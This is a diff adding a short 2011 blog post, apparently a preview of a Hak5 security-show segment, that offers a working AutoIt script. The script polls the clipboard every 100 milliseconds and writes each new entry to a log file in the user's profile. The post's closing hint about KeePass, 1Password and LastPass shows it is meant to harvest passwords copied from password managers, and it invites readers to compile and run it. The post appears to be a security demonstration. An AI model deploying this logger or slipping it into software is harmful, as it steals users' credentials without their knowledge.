@@ -1,0 +1,34 @@
+---
+author: mubix
+comments: true
+date: 2011-12-26 06:06:20+00:00
+layout: post
+title: Hak5 Segment Sneak Peak
+categories:
+- hak5
+- releases
+- clipboard
+- autoit
+---
+
+Since it's Christmas and all, I thought I'd post the code snippet from my Hak5 segment a bit early:
+
+```
+#include <Clipboard.au3>
+#include <File.au3>
+$oldclip = ""
+While 1
+    $clip = _ClipBoard_GetData()
+    If $clip <> "0" Then
+        If $clip <> $oldclip Then
+            _FileWriteLog(@UserProfileDir & "clip.log", $clip)
+            $oldclip = $clip
+        EndIf
+    EndIf
+    Sleep(100)
+WEnd
+```    
+
+It's pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I'm sure can figure it out just by reading it).
+
+(Think KeePass, 1Password, LastPass...)
